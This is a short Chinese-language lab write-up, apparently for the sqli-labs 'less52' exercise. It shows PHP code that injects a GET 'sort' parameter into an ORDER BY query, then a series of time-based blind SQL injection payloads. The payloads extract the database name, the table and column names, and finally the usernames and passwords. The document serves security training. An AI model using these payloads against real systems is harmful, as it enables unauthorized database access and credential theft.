---
title: less52
url: https://www.yuque.com/u29002979/ep2zrx/pmhngqo034wlqszf
---

```bash
$id=$_GET['sort'];	


$sql="SELECT * FROM users ORDER BY $id";
/* execute multi query */
if (mysqli_multi_query($con1, $sql))
```

没有报错回显，还是时间盲注  ，数字型

<a name="ukBAB"></a>

# 时间盲注

```bash
拆解数据库名称长度
?sort=1 and if(length(database())=8,sleep(3),0)--+

猜解数据库名称 
?sort=1 and if(ascii(mid(database(),1,1))<=135,sleep(3),0)--+

猜解数据表名称长度
?sort=1 and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=29,sleep(3),0)--+

猜解数据表名称
?sort=1 and if(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)='e',sleep(3),0)--+


猜解字段名称长度
?sort=1 and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))=20,sleep(3),0)#

猜解字段名称
?sort=1 and if(mid((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1)='i',sleep(3),0)--+

猜解字段内容
?sort=1 and if(mid((select group_concat(username,0x7e,password) from users),1,1)='D',sleep(3),0)--+
```
